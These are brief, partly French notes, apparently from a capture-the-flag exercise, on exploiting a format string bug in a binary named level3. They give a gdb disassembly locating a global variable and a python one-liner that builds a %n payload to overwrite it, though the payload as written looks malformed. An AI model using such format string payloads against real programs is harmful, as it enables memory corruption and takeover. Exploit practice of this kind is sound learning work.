1. offset

2. buffer = addresse + valeur + %offset$n

3. %n

4. format string

m addr 0x804988c

```Shell
(gdb) disas v
[...]
 0x080484da <+54>:    mov    0x804988c,%eax
[...]

 ```

python -c 'print("A" * 64 + "%\x8c\x98\x04\x08$n")' > /tmp/input3

cat /tmp/input3 - | ./level3